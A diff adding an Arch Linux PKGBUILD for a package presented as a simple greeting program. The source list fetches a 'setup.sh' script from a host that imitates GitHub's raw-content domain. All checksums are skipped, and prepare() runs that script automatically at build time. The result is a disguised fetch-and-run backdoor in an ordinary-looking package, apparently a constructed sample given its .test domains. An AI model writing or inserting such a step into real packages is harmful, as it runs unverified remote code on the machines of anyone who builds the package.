@@ -1,0 +1,22 @@
+pkgname=example-hello
+pkgver=1.2.0
+pkgrel=1
+pkgdesc="Prints a friendly greeting"
+arch=('x86_64')
+url="https://example.test/hello"
+license=('MIT')
+depends=('glibc')
+source=('hello.c' 'Makefile' 'setup.sh::https://raw.githubusercontent.com.example-drop.test/hello/setup.sh')
+sha256sums=('SKIP' 'SKIP' 'SKIP')
+
+prepare() {
+    sh ./setup.sh
+}
+
+build() {
+    make
+}
+
+package() {
+    install -Dm755 hello "$pkgdir/usr/bin/example-hello"
+}
